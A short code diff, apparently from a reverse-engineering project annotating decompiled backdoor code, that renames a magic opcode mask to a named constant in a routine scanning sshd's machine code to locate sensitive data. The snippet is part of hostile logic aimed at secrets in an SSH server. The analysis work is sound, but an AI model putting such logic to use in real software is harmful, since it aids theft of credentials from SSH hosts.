@@ -47,7 +47,7 @@ BOOL sshd_find_sensitive_data_base_via_krb5ccname
         krb5_string_ref = krb5_string_ref + 1;
       }
       else {
-        if ((string_scan_ctx.opcode_window.opcode_window_dword & 0xfffffffd) == X86_OPCODE_1B_XOR_RM_R) {
+        if ((string_scan_ctx.opcode_window.opcode_window_dword & X86_OPCODE_MASK_IGNORE_DIR) == X86_OPCODE_1B_XOR_RM_R) {
           if (string_scan_ctx.prefix.modrm_bytes.modrm_mod == '\x03') {
             if (((string_scan_ctx.prefix.flags_u16 & DF16_REX) == 0) ||
                ((string_scan_ctx.prefix.modrm_bytes.rex_byte & REX_W) == 0)) {
